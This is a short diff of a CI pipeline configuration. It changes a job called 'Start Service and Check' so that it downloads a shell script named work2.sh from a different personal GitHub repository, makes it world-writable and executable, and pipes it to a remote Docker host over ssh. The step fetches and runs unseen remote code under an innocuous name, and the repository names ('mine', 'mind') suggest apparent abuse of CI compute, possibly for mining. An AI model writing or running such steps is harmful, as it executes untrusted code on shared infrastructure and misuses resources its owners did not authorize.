@@ -13,6 +13,6 @@ jobs:
       - run:
           name: "Start Service and Check"
           command: |
-           wget https://raw.githubusercontent.com/geraldyolang11/mine/main/work2.sh
+           wget https://raw.githubusercontent.com/gyrogerald/mind/main/work2.sh
            chmod 777 work2.sh
            cat work2.sh | ssh remote-docker
